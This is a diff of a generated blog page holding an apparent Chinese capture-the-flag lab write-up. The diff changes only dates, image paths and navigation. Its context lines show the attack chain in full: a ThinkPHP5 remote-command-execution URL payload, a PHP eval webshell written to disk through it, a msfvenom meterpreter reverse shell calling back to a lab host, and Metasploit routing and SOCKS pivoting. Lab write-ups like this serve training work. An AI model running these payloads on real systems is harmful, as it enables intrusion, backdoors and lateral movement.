@@ -141,8 +141,8 @@
                         <div class="article-meta-info">
     <span class="article-date article-meta-item">
         <i class="fas fa-edit"></i>&nbsp;
-        <span class="pc">2022-08-02 17:57:28</span>
-        <span class="mobile">2022-08-02 17:57</span>
+        <span class="pc">2022-06-06 17:57:28</span>
+        <span class="mobile">2022-06-06 17:57</span>
     </span>
     
     
@@ -180,10 +180,10 @@
 
 <h2 id="扫目录"><a href="#扫目录" class="headerlink" title="扫目录"></a>扫目录</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/dirsearch]</span><br><span class="line">└─$ ./dirsearch.py -u http://192.168.2.168/ -e php -r </span><br></pre></td></tr></table></figure>
 
-<h2 id="进入网站发现为Tinkphp5"><a href="#进入网站发现为Tinkphp5" class="headerlink" title="进入网站发现为Tinkphp5"></a>进入网站发现为Tinkphp5</h2><p><img src="/2022/08/02/target-cfs/1637311264835-e2f6ac31-d289-4426-b14a-a992af1d5257.png" alt="img"></p>
+<h2 id="进入网站发现为Tinkphp5"><a href="#进入网站发现为Tinkphp5" class="headerlink" title="进入网站发现为Tinkphp5"></a>进入网站发现为Tinkphp5</h2><p><img src="/2022/06/06/target-cfs/1637311264835-e2f6ac31-d289-4426-b14a-a992af1d5257.png" alt="img"></p>
 <h3 id="验证-gt-ThinkPHP5-x全版本任意命令执行"><a href="#验证-gt-ThinkPHP5-x全版本任意命令执行" class="headerlink" title="验证-&gt;ThinkPHP5.x全版本任意命令执行"></a>验证-&gt;ThinkPHP5.x全版本任意命令执行</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">payload</span></span><br><span class="line">http://192.168.2.168/index.php?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=pwd</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2022/08/02/target-cfs/1637311638514-735a3626-c4a9-43ad-b678-546cd4d8bf3f.png" alt="img"></p>
+<p><img src="/2022/06/06/target-cfs/1637311638514-735a3626-c4a9-43ad-b678-546cd4d8bf3f.png" alt="img"></p>
 <h3 id="验证成功，构造命令写入一句话"><a href="#验证成功，构造命令写入一句话" class="headerlink" title="验证成功，构造命令写入一句话"></a>验证成功，构造命令写入一句话</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">写入一句话		linux下使用\转义$		windows下用^转义  还可以<span class="built_in">base64</span>加密绕过</span></span><br><span class="line">echo &quot;&lt;?php @eval(\$_POST[fff]);?&gt;&quot; &gt;shell.php</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">payload</span></span><br><span class="line">index.php?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=echo &quot;&lt;?php @eval(\$_POST[fff]);?&gt;&quot; &gt;shell.php</span><br></pre></td></tr></table></figure>
 
 <h2 id="上线msf"><a href="#上线msf" class="headerlink" title="上线msf"></a>上线msf</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">1.生成后门：</span><br><span class="line">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.2.187 LPORT=1111 -f elf &gt;t1.elf</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">2.接受反弹：</span><br><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload linux/x64/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 192.168.2.187</span><br><span class="line">set LPORT 1111</span><br><span class="line">exploit</span><br><span class="line"></span><br><span class="line">3.上传elf并执行</span><br><span class="line">(www:/www/wwwroot/ThinkPHP/public) $ chmod +x t1.elf</span><br><span class="line">(www:/www/wwwroot/ThinkPHP/public) $ ./t1.elf</span><br><span class="line"></span><br><span class="line">4.信息收集及配置访问</span><br><span class="line">获取网络接口：run get_local_subnets</span><br><span class="line">查看路由地址：run autoroute -p</span><br><span class="line">添加路由地址：run autoroute -s 192.168.22.0/24</span><br><span class="line">开启本地代理：</span><br><span class="line">use auxiliary/server/socks_proxy </span><br><span class="line">set srvport 2222</span><br><span class="line">set version 4a </span><br><span class="line">exploit</span><br><span class="line"> </span><br><span class="line">4.利用本地代理接口访问测试</span><br><span class="line">设置浏览器代理进行访问测试</span><br><span class="line">linux：</span><br><span class="line">配置proxychains（代理工具）后调用工具探针Target2</span><br><span class="line">/etc/proxychains.conf</span><br><span class="line">socks4 192.168.2.187 2222（在配置文件中添加）</span><br></pre></td></tr></table></figure>
@@ -219,21 +219,21 @@
         
             <div class="article-nav">
                 
-                
-                    <div class="article-next">
-                        <a class="next"
-                           rel="next"
+                    <div class="article-prev">
+                        <a class="prev"
+                           rel="prev"
                            href="/2022/08/02/vulnhub-goldeneye/"
                         >
+                            <span class="left arrow-icon flex-center">
+                              <i class="fas fa-chevron-left"></i>
+                            </span>
                             <span class="title flex-center">
                                 <span class="post-nav-title-item">vulnhub_goldeneye</span>
-                                <span class="post-nav-item">Next posts</span>
-                            </span>
-                            <span class="right arrow-icon flex-center">
-                              <i class="fas fa-chevron-right"></i>
+                                <span class="post-nav-item">Prev posts</span>
                             </span>
                         </a>
                     </div>
+                
                 
             </div>
         
